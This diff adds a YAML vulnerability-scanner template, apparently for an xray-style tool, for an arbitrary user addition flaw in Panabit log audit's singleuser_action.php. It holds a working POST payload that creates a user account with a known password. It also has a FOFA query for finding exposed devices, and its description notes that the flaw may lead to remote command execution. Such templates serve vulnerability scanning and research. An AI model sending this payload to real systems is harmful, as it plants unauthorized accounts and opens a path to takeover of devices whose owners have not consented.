@@ -1,0 +1,22 @@
+id: panabit-log-useradd
+
+info:
+  name: Panabit log audit singleuser_ Action.php Arbitrary User Addition
+  author: ct
+  severity: high
+  verified: true
+  description: |
+    panabit日志审计存在 singleuser_action.php 任意用户添加漏洞，后台若存在终端命令模块可rce。
+    fofa: body="Maintain/cloud_index.php" || app="Panabit-Panalog"
+set:
+  hostname: request.url.host
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /singleuser_action.php
+      body: |
+        { "syncInfo": { "user": { "userId": "132", "userName": "132", "employeeId": "132", "departmentId": "132", "departmentName": "132", "coporationId": "132", "corporationName": "132", "userSex": "1",  "userDuty": "132", "userBirthday": "132", "userPost": "132", "userPostCode": "132", "userAlias": "132", "userRank": "132", "userPhone": "132", "userHomeAddress": "132", "userMobilePhone": "132", "userMailAddress": "132", "userMSN": "132", "userNt": "132", "userCA": "132", "userPwd": "132", "userClass": "132", "parentId": "132", "bxlx": "132" },"operationType": "ADD_USER" } }
+    expression: response.status == 200 && response.body.bcontains(b'yes') && response.body.bcontains(b'ok')
+expression: r0()
